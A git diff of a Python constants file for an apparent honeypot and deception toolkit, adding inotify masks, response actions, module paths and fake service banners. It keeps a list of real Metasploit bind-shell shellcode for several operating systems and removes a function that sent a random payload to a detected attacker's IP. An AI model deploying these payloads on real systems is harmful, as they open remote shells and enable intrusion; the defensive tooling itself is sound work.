@@ -1,16 +1,81 @@
-from random import randint
+FORMAT = 'utf-8'
 
-from services.utils import *
+# Inotify masks ------------------
+IN_ACCESS = 0x00000001  # File was accessed
+IN_MODIFY = 0x00000002  # File was modified
+IN_ATTRIB = 0x00000004  # Metadata changed
+IN_CLOSE_WRITE = 0x00000008  # Writtable file was closed
+IN_CLOSE_NOWRITE = 0x00000010  # Unwrittable file closed
+IN_OPEN = 0x00000020  # File was opened
+IN_MOVED_FROM = 0x00000040  # File was moved from X
+IN_MOVED_TO = 0x00000080  # File was moved to Y
+IN_CREATE = 0x00000100  # Subfile was created
+IN_DELETE = 0x00000200  # Subfile was deleted
+IN_DELETE_SELF = 0x00000400  # Self was deleted
+IN_ISDIR = 0x40000000  # event occurred against dir
+IN_MOVE = IN_MOVED_FROM | IN_MOVED_TO
+IN_CLOSE = IN_CLOSE_WRITE | IN_CLOSE_NOWRITE
 
+# Actions masks ------------------
+LOG_EVENT = 0x00000001  # log the event
+SAVE_DATA = 0x00000002  # save to /var/adarch the file which called the event
+KILL_PID = 0x00000004  # kill the pid that generated the event
+KILL_USER = 0x00000008  # kill the user that generated the event
+LOCK_USER = 0x00000010  # lock the user account
+SHUTDOWN_HOST = 0x00000020  # shutdown host
+
+# Active mode ----------------------
+IMMEDIATE = 0
+WAIT = 1
+
+# Socket shutdown mode -----------------
+SHUT_RD = 0
+SHUT_WR = 1
+SHUT_RDWR = 2
+
+# BW LIST files ----------
+BLACKLIST = "Environment/persistent/blacklist.txt"
+WHITELIST = "Environment/persistent/whitelist.txt"
+
+# SUB PROCESS workers ----------
+MAX_WORKERS = 5
+
+# LOG Information
+LOG_FILE = "Environment/persistent/log.txt"
+
+# Log levels ---------------------
+DEBUG = 0
+INFO = 1
+WARNING = 2
+ERROR = 3
+CRITICAL = 4
+
+# DATABASE
+DB_Artillery = "Environment/persistent/artillery_integrity.db"
+DB_Cryptolocked = "Environment/persistent/cryptolocked.db"
+DB_Endlessh = "Environment/persistent/endlessh.db"
+DB_Stealth = "Environment/persistent/stealthcryptolocked.db"
+
+# Response message
+MSG_endlessh = "SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2\n"
+MSG_honeyports = "Connecting.."
+MSG_inviports = "Protocol mismatch.\n"
+
+# General parameter
+ADMISSIBLE_ATTEMPTS = 10
+FILELOG = "/var/log/auth.log"
+N_TENTACTLES = 5
+PORTS = [21, 80, 445]
+SIGNATURES = "Environment/persistent/portspoof_signatures"
 
 PAYLOADS = [
-        #               linux/x86/shell_bind_tcp - 78 bytes
-        #               http://www.metasploit.com
-        #               InitialAutoRunScript=, PrependSetuid=false,
-        #               PrependSetresuid=false, AutoRunScript=, AppendExit=false,
-        #               VERBOSE=false, PrependSetreuid=false, RHOST=,
-        #               PrependChrootBreak=false, LPORT=4444
-        '''
+    #               linux/x86/shell_bind_tcp - 78 bytes
+    #               http://www.metasploit.com
+    #               InitialAutoRunScript=, PrependSetuid=false,
+    #               PrependSetresuid=false, AutoRunScript=, AppendExit=false,
+    #               VERBOSE=false, PrependSetreuid=false, RHOST=,
+    #               PrependChrootBreak=false, LPORT=4444
+    '''
                 \x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80
                 \x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a
                 \x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0
@@ -18,24 +83,24 @@ PAYLOADS = [
                 \x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0
                 \x0b\xcd\x80''',
 
-        #               osx/x86/shell_bind_tcp - 74 bytes
-        #               http://www.metasploit.com
-        #               InitialAutoRunScript=, PrependSetreuid=false,
-        #               PrependSetresuid=false, RHOST=, AutoRunScript=, LPORT=4444,
-        #               AppendExit=false, PrependSetuid=false, VERBOSE=false
-        '''
+    #               osx/x86/shell_bind_tcp - 74 bytes
+    #               http://www.metasploit.com
+    #               InitialAutoRunScript=, PrependSetreuid=false,
+    #               PrependSetresuid=false, RHOST=, AutoRunScript=, LPORT=4444,
+    #               AppendExit=false, PrependSetuid=false, VERBOSE=false
+    '''
                 \x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02
                 \x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89
                 \x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58
                 \xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f
                 \x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80''',
 
-        #               solaris/x86/shell_bind_tcp - 95 bytes
-        #               http://www.metasploit.com
-        #               InitialAutoRunScript=, AppendExit=false,
-        #               PrependSetreuid=false, RHOST=, PrependSetuid=false,
-        #               VERBOSE=false, AutoRunScript=, LPORT=4444
-        '''
+    #               solaris/x86/shell_bind_tcp - 95 bytes
+    #               http://www.metasploit.com
+    #               InitialAutoRunScript=, AppendExit=false,
+    #               PrependSetreuid=false, RHOST=, PrependSetuid=false,
+    #               VERBOSE=false, AutoRunScript=, LPORT=4444
+    '''
                 \x68\xff\xd8\xff\x3c\x6a\x65\x89\xe6\xf7\x56\x04\xf6\x16\x31"
                 \xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x6a\x02\x50\x50\x6a\x02"
                 \x6a\x02\xb0\xe6\xff\xd6\x6a\x10\x57\x50\x31\xc0\xb0\xe8\xff"
@@ -44,11 +109,11 @@ PAYLOADS = [
                 \x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x51"
                 \x53\xb0\x3b\xff\xd6''',
 
-        #               windows/shell_bind_tcp - 341 bytes
-        #               http://www.metasploit.com
-        #               EXITFUNC=process, RHOST=, VERBOSE=false, AutoRunScript=,
-        #               InitialAutoRunScript=, LPORT=4444
-        '''
+    #               windows/shell_bind_tcp - 341 bytes
+    #               http://www.metasploit.com
+    #               EXITFUNC=process, RHOST=, VERBOSE=false, AutoRunScript=,
+    #               InitialAutoRunScript=, LPORT=4444
+    '''
                 \xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30
                 \x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff
                 \x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2
@@ -73,11 +138,11 @@ PAYLOADS = [
                 \x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75
                 \x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5''',
 
-        #               windows/x64/shell_bind_tcp - 505 bytes
-        #               http://www.metasploit.com
-        #               RHOST=, EXITFUNC=process, LPORT=4444, VERBOSE=false,
-        #               InitialAutoRunScript=, AutoRunScript=
-        '''
+    #               windows/x64/shell_bind_tcp - 505 bytes
+    #               http://www.metasploit.com
+    #               RHOST=, EXITFUNC=process, LPORT=4444, VERBOSE=false,
+    #               InitialAutoRunScript=, AutoRunScript=
+    '''
                 \xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52
                 \x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48
                 \x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9
@@ -112,19 +177,6 @@ PAYLOADS = [
                 \xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48
                 \x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13
                 \x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5'''
-    ]
+]
 
 
-def run_tcprooter(writer, malicious_ip, msg):
-    log.sintetic_write(log.WARNING, "TCPROOTER",
-                       "detected activity from IP {} - content: {}".format(malicious_ip, msg))
-
-    # Random version
-    writer.write(PAYLOADS[randint(0, len(PAYLOADS) - 1)].encode(Core.FORMAT))
-
-    # Static version
-    # writer.write(Tcprooter.PAYLOADS[1].encode(Core.FORMAT))
-
-    writer.shutdown(Core.SHUT_RDWR)
-    writer.close()
-    return
